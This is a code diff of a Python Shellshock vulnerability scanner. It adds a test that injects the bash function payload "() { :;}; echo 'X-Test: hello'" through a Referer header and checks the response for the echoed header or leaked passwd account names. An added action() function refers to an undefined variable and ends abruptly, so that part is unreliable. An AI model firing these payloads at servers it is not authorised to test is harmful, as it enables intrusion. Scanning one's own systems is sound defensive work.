@@ -42,26 +42,60 @@ def testBashShock1(url):
 	try:
 		response = opener.open(req, timeout = 15)
 		if response:
-			if response.info().getheader('root') or response.info().getheader('nobody') or \
-				response.info().getheader('daemon'):
+			if 'root' in response.info() or 'nobody' in response.info() or  'daemon' in response.info():
 				print
 				print 'PANIC!!!'
 				print '******* [shock] [URL: %s], [Header: %s] [1]' % (url, 'X-Test')
 				print 'root:' + response.info().getheader('root')
 				return True
 
-			html = response.read()
-			if html.find('root:') != -1:
-				print
-				print 'PANIC!!!'
-				print '******* [shock] [URL: %s], [Header: %s] [2]' % (url, 'X-Test')
-			 	return True
+			#html = response.read()
+			#if html.find('root:') != -1:
+			#	print
+			#	print 'PANIC!!!'
+			#	print '******* [shock] [URL: %s], [Header: %s] [2]' % (url, 'X-Test')
+			# 	return True
 			#for k, v in response.info().items():
 			#	print k + ': ', v
 	except Exception, e:
 		pass
 		#print 'Exception: ', e
 	return False
+
+def testBashShock2(url):
+	opener = urllib2.build_opener()
+	webutils.setupOpener(opener)
+	req = urllib2.Request(url)
+	exploit = "() { :;}; echo 'X-Test: hello'"
+	#req.add_header('Proxy-Connection', 'keep-alive')
+	#req.add_header('Cache-Control', 'max-age=0')
+	req.add_header('Referer', exploit)
+	try:
+		response = opener.open(req, timeout = 15)
+		if response:
+			if 'X-Test' in response.info(): 
+				print
+				print 'PANIC!!!'
+				print '******* [shock] [URL: %s], [Header: %s] [*]' % (url, 'X-Test')
+				print 'root:' + response.info().getheader('root')
+				return True
+	except Exception, e:
+		pass
+	return False
+
+def action(result):                                                                            
+	ua = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0'
+	url = result['Url']                                                                        
+	req = urllib2.Request(url)                                                                 
+	req.add_header('User-Agent', ua)                                                           
+	req.add_header('Referer', exploit)                                                         
+	try:                                                                                       
+		r = urllib2.urlopen(req, timeout=60)                                                   
+	except Exception as e:                                                                     
+		return                                                                                 
+	resp_headers = r.info()                                                                    
+	if 'shellshock' in r.info():                                                               
+		return                                                                                     
 
 TIMEBASED_TIMEOUT = 15
 def testBashShockByTime(url, header):
@@ -160,6 +194,8 @@ def testBashShock5(url):
 
 def scan(url, opener):
 	if testBashShock1(url):
+		return True
+	if testBashShock2(url):
 		return True
 	if testBashShockByTime(url, 'Referer'):
 		return True
